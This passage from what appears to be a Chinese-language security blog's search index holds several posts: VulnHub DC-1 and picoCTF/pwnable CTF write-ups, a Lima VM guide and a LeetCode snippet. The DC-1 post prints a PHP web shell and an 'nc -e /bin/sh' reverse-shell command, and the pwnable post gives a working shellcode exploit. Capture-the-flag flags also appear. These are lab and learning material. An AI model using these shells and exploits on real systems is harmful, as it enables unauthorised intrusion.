keyword">int</span> target<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>target <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* Chech digit */</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      target <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>        sum <span class="token operator">+=</span> <span class="token punctuation">(</span>target <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>target <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>bool <span class="token function">isHappy</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> fast <span class="token operator">=</span> n<span class="token punctuation">,</span> slow <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>          <span class="token comment">/* slow calculate once per round*/</span>        slow <span class="token operator">=</span> <span class="token function">check_happy</span><span class="token punctuation">(</span>slow<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/* fast calculate two times per round*/</span>        fast <span class="token operator">=</span> <span class="token function">check_happy</span><span class="token punctuation">(</span>fast<span class="token punctuation">)</span><span class="token punctuation">;</span>        fast <span class="token operator">=</span> <span class="token function">check_happy</span><span class="token punctuation">(</span>fast<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>slow <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> fast <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> true<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>slow <span class="token operator">!=</span> fast<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span>  false<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 程式演算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>M1 Mac 運行x86機器的簡單方法</title>
      <link href="/%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/2022-03-20-M1-Mac-X86/"/>
      <url>/%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/2022-03-20-M1-Mac-X86/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>換了人生中第一台macbook,但是卻是arm架構的,很多軟體還不是很支援,試了用qemu裝vm也試了rdp port-forwaring 回去,但前者不知道為什麼很耗電而後者很吃網路的狀況,最後！我找到了我的救星那就是Lima!</p><h1 id="Lima-VM"><a href="#Lima-VM" class="headerlink" title="Lima-VM"></a>Lima-VM</h1><p>是一個可以使用qemu模擬x86的開源軟體且非常輕量</p><p><a href="https://github.com/lima-vm/lima">Lima Github Repo</a></p><h1 id="安裝方法"><a href="#安裝方法" class="headerlink" title="安裝方法"></a>安裝方法</h1><h2 id="使用brew安裝"><a href="#使用brew安裝" class="headerlink" title="使用brew安裝"></a>使用brew安裝</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> lima<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="撰寫config檔案-yaml格式"><a href="#撰寫config檔案-yaml格式" class="headerlink" title="撰寫config檔案(yaml格式)"></a>撰寫config檔案(yaml格式)</h2><p>這邊直接上我的配置,新增檔案 ubuntu-22_04.yaml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># if using specific environment, add `arch` here to specify the architecture</span><span class="token key atrule">arch</span><span class="token punctuation">:</span> <span class="token string">"x86_64"</span><span class="token comment"># ubuntu-22.04.yaml example from lima official (here is all the same as the official example)</span><span class="token key atrule">images</span><span class="token punctuation">:</span><span class="token comment"># Try to use release-yyyyMMdd image if available. Note that release-yyyyMMdd will be removed after several months.</span><span class="token punctuation">-</span> <span class="token key atrule">location</span><span class="token punctuation">:</span> <span class="token string">"https://cloud-images.ubuntu.com/releases/22.04/release-20221214/ubuntu-22.04-server-cloudimg-amd64.img"</span><span class="token key atrule">arch</span><span class="token punctuation">:</span> <span class="token string">"x86_64"</span><span class="token key atrule">digest</span><span class="token punctuation">:</span> <span class="token string">"sha256:b9a5a216901c34742ffe662b691db114269aaa25c90eb77f3ef4dd4f818e78a3"</span><span class="token punctuation">-</span> <span class="token key atrule">location</span><span class="token punctuation">:</span> <span class="token string">"https://cloud-images.ubuntu.com/releases/22.04/release-20221214/ubuntu-22.04-server-cloudimg-arm64.img"</span><span class="token key atrule">arch</span><span class="token punctuation">:</span> <span class="token string">"aarch64"</span><span class="token key atrule">digest</span><span class="token punctuation">:</span> <span class="token string">"sha256:b27163374c834c770e8db023fb21205529cea494257bf5ba866b8b1ae5969164"</span><span class="token comment"># Fallback to the latest release image.</span><span class="token comment"># Hint: run `limactl prune` to invalidate the cache</span><span class="token punctuation">-</span> <span class="token key atrule">location</span><span class="token punctuation">:</span> <span class="token string">"https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-amd64.img"</span><span class="token key atrule">arch</span><span class="token punctuation">:</span> <span class="token string">"x86_64"</span><span class="token punctuation">-</span> <span class="token key atrule">location</span><span class="token punctuation">:</span> <span class="token string">"https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-arm64.img"</span><span class="token key atrule">arch</span><span class="token punctuation">:</span> <span class="token string">"aarch64"</span><span class="token comment"># mount the host's $HOME directory to the guest's /home/ubuntu</span><span class="token comment"># if need writable, add `writable: true` under the mount</span><span class="token key atrule">mounts</span><span class="token punctuation">:</span><span class="token punctuation">-</span> <span class="token key atrule">location</span><span class="token punctuation">:</span> <span class="token string">"~"</span><span class="token punctuation">-</span> <span class="token key atrule">location</span><span class="token punctuation">:</span> <span class="token string">"/tmp/lima"</span>  <span class="token key atrule">writable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="啟動Lima與配置"><a href="#啟動Lima與配置" class="headerlink" title="啟動Lima與配置"></a>啟動Lima與配置</h2><pre class="line-numbers language-none"><code class="language-none">limactl start ubuntu-22_04.yaml --name ubuntu-22_04-amd64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到 INFO[xxxx] READY. Run lima to open the shell 就代表成功了</p><h2 id="進入shell"><a href="#進入shell" class="headerlink" title="進入shell"></a>進入shell</h2><pre class="line-numbers language-none"><code class="language-none">limactl shell ubuntu-22_04-amd64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 好用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架構 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-DC1</title>
      <link href="/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/2022-03-20-VulnHub-DC1/"/>
      <url>/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/2022-03-20-VulnHub-DC1/</url>
      
        <content type="html"><![CDATA[<h1 id="尋找DC-1靶機"><a href="#尋找DC-1靶機" class="headerlink" title="尋找DC-1靶機"></a>尋找DC-1靶機</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.0</span>.2.4 <span class="token parameter variable">-A</span> -p-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="發現有port-80-直接瀏覽網頁"><a href="#發現有port-80-直接瀏覽網頁" class="headerlink" title="發現有port 80 -&gt; 直接瀏覽網頁"></a>發現有port 80 -&gt; 直接瀏覽網頁</h1><p><img src="https://i.imgur.com/I1N1wgZ.png"></p><h1 id="使用wappalyzer得知使用Drupal-7"><a href="#使用wappalyzer得知使用Drupal-7" class="headerlink" title="使用wappalyzer得知使用Drupal 7"></a>使用wappalyzer得知使用Drupal 7</h1><p><img src="https://i.imgur.com/B8nHsAB.png"></p><h1 id="搜尋已知Exploit來取得RCE"><a href="#搜尋已知Exploit來取得RCE" class="headerlink" title="搜尋已知Exploit來取得RCE"></a>搜尋已知Exploit來取得RCE</h1><ul><li>CVE-2018-7600<blockquote><p>Exploit:<a href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a></p></blockquote></li></ul><h1 id="ls-發現flag1"><a href="#ls-發現flag1" class="headerlink" title="ls -&gt; 發現flag1"></a>ls -&gt; 發現flag1</h1><p><img src="https://i.imgur.com/4pA9CSv.png"></p><h1 id="發現有shell-php"><a href="#發現有shell-php" class="headerlink" title="發現有shell.php"></a>發現有shell.php</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">system</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' 2>&amp;1 '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="使用nc-監聽取回reverse-shell-python-pty"><a href="#使用nc-監聽取回reverse-shell-python-pty" class="headerlink" title="使用nc 監聽取回reverse shell(python pty)"></a>使用nc 監聽取回reverse shell(python pty)</h1><pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">http:&#x2F;&#x2F;10.0.2.4&#x2F;shell.php?c&#x3D;nc%20-e%20%2Fbin%2Fsh%2010.0.2.15%208080nc -e &#x2F;bin&#x2F;sh 10.0.2.15 8080python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 滲透測試 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF Cookies [40points]</title>
      <link href="/CTF/picoCTF/Web%20Exploitation/Cookies/2022-03-20-Cookies/"/>
      <url>/CTF/picoCTF/Web%20Exploitation/Cookies/2022-03-20-Cookies/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-Exploitation-Cookies-40points"><a href="#Web-Exploitation-Cookies-40points" class="headerlink" title="[Web Exploitation] Cookies - 40points"></a>[Web Exploitation] Cookies - 40points</h1><p>初始畫面<br><img src="https://i.imgur.com/JCj8GL7.png" alt="Image"></p><p>輸入snickerdoodle，發現進入畫面不一樣<br><img src="https://i.imgur.com/R2hIkU3.png" alt="Image"></p><p>嘗試撰寫暴力破解腳本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span><span class="token keyword">import</span> requests<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cookie <span class="token operator">=</span> <span class="token string">'name=&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span>cookie<span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://mercury.picoctf.net:&lt;port>/check'</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">'picoCTF'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>取得FLAG<br><img src="https://i.imgur.com/yDhWHOX.png" alt="Image"></p><p>FLAG:picoCTF{3v3ry1_l0v3s_c00k135_064663be}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Web Exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>彩色的Ascii Banner</title>
      <link href="/Linux/2022-03-18-colorful-banner/"/>
      <url>/Linux/2022-03-18-colorful-banner/</url>
      
        <content type="html"><![CDATA[<h2 id="1-安裝"><a href="#1-安裝" class="headerlink" title="1. 安裝"></a>1. 安裝</h2><pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">apt install figlet lolcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-下載字形檔案"><a href="#2-下載字形檔案" class="headerlink" title="2.下載字形檔案"></a>2.下載字形檔案</h2><p><a href="https://github.com/xero/figlet-fonts">figlet-fonts</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/xero/figlet-fonts.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-複製到figlet目錄"><a href="#3-複製到figlet目錄" class="headerlink" title="3.複製到figlet目錄"></a>3.複製到figlet目錄</h2><p><img src="https://i.imgur.com/TCfBBzR.png"></p><h2 id="4-使用方式"><a href="#4-使用方式" class="headerlink" title="4.使用方式"></a>4.使用方式</h2><p><img src="https://i.imgur.com/2IRXRc3.png"></p><h2 id="5-加入到-bashrc"><a href="#5-加入到-bashrc" class="headerlink" title="5.加入到~&#x2F;.bashrc"></a>5.加入到~&#x2F;.bashrc</h2><p><img src="https://i.imgur.com/P4FZgbF.png"></p><h2 id="6-完成"><a href="#6-完成" class="headerlink" title="6.完成"></a>6.完成</h2><p><img src="https://i.imgur.com/YM27FuL.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 優化設置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable start [100pt]</title>
      <link href="/CTF/pwnable/2022-03-18-pwnable-start/"/>
      <url>/CTF/pwnable/2022-03-18-pwnable-start/</url>
      
        <content type="html"><![CDATA[<h2 id="看保護機制"><a href="#看保護機制" class="headerlink" title="看保護機制"></a>看保護機制</h2><blockquote><p>checksec start</p></blockquote><p><img src="https://i.imgur.com/27SRlvR.png"></p><h2 id="看源碼"><a href="#看源碼" class="headerlink" title="看源碼"></a>看源碼</h2><blockquote><p>objdump -d -M intel start</p></blockquote><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">start:     file format elf32-i386Disassembly of section .text:08048060 &lt;_start&gt;: 8048060:54                   push   esp 8048061:68 9d 80 04 08       push   0x804809d 8048066:31 c0                xor    eax,eax 8048068:31 db                xor    ebx,ebx 804806a:31 c9                xor    ecx,ecx 804806c:31 d2                xor    edx,edx 804806e:68 43 54 46 3a       push   0x3a465443 8048073:68 74 68 65 20       push   0x20656874 8048078:68 61 72 74 20       push   0x20747261 804807d:68 73 20 73 74       push   0x74732073 8048082:68 4c 65 74 27       push   0x2774654c 8048087:89 e1                mov    ecx,esp 8048089:b2 14                mov    dl,0x14 804808b:b3 01                mov    bl,0x1 804808d:b0 04                mov    al,0x4 804808f:cd 80                int    0x80 8048091:31 db                xor    ebx,ebx 8048093:b2 3c                mov    dl,0x3c 8048095:b0 03                mov    al,0x3 8048097:cd 80                int    0x80 8048099:83 c4 14             add    esp,0x14 804809c:c3                   ret    0804809d &lt;_exit&gt;: 804809d:5c                   pop    esp 804809e:31 c0                xor    eax,eax 80480a0:40                   inc    eax 80480a1:cd 80                int    0x80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span><span class="token comment">#context(log_level='debug')</span>filename <span class="token operator">=</span> <span class="token string">'./start'</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chall.pwnable.tw'</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token comment">#io = process(filename)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'CTF:'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8048087</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ad <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ad <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x00'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF GET aHEAD [50 points]</title>
      <link href="/CTF/picoCTF/Web%20Exploitation/GET%20aHEAD/posts/"/>
      <url>/CTF/picoCTF/Web%20Exploitation/GET%20aHEAD/posts/</url>
      
        <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Find the flag being held on this server to get ahead of the competition <a href="http://mercury.picoctf.net:47967/">http://mercury.picoctf.net:47967/</a></p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="看HTML發現有兩種請求方式"><a href="#看HTML發現有兩種請求方式" class="headerlink" title="看HTML發現有兩種請求方式"></a>看HTML發現有兩種請求方式</h2><blockquote><p>GET 和 POST </p></blockquote><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel panel-primary<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin-top</span><span class="token punctuation">:</span>50px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel-heading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel-title<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Red<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Choose Red<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel panel-primary<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">margin-top</span><span class="token punctuation">:</span>50px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel-heading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel-title<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span>blue</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Blue<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Choose Blue<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="嘗試使用HEAD請求"><a href="#嘗試使用HEAD請求" class="headerlink" title="嘗試使用HEAD請求"></a>嘗試使用HEAD請求</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://mercury.picoctf.net:47967/index.php"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"HEAD"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token string">'flag'</span><span class="token builtin class-name">:</span> <span class="token string">'picoCTF&#123;r3j3ct_th3_du4l1ty_cca66bd3&#125;'</span>, <span class="token string">'Content-type'</span><span class="token builtin class-name">:</span> <span class="token string">'text/html; charset=UTF-8'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Web Exploit </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
